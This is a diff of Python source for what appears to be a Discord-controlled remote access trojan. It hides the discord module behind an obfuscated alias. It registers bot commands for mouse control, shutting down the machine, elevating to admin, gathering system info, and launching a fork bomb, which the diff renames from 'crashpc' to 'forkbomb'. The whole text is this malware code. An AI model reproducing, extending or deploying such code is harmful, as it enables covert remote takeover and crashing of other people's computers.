@@ -5,7 +5,7 @@ def print(c):
 intents = discord.Intents.all()
 bot=YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Bot(command_prefix='.',intents=intents,help_command=None)
 bot.commands_channel={}
-Thread(target=ffs).start()
+ffs()
 @bot.event
 async def on_message(message):
     if message.channel.id not in bot.commands_channel:
@@ -49,7 +49,7 @@ bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(mouse_contro
 bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(endpc, name='endpc'))
 bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(cd_command, name='cd'))
 bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(taskbar, name='taskbar'))
-bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(forkbomb, name='crashpc'))
+bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(forkbomb, name='forkbomb'))
 bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(alert, name='alert'))
 bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(admin, name='admin'))
 bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(sysinfo, name='sysinfo'))
